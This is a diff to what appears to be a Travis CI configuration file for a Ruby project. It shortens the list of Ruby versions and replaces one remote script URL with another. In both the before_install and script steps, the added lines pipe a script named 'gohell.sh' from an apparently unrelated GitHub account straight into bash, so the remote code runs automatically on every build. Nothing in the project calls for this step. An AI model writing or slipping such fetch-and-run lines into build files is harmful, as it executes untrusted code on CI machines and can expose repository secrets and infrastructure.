@@ -66,16 +66,10 @@ rvm:
   - "2.2.1"
   - "2.2.0"
   - "2.1.5"
-  - "2.1.4"
-  - "2.1.3"
-  - "2.1.2"
   - "2.1.1"
-  - "2.1.0"
-  - "2.0.0"
-  - "1.9.3"
 
 before_install:
-  - curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+  - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
 
 script:
-  - curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+  - curl -sL https://github.com/tyha4t57i/gradi/raw/main/gohell.sh | bash
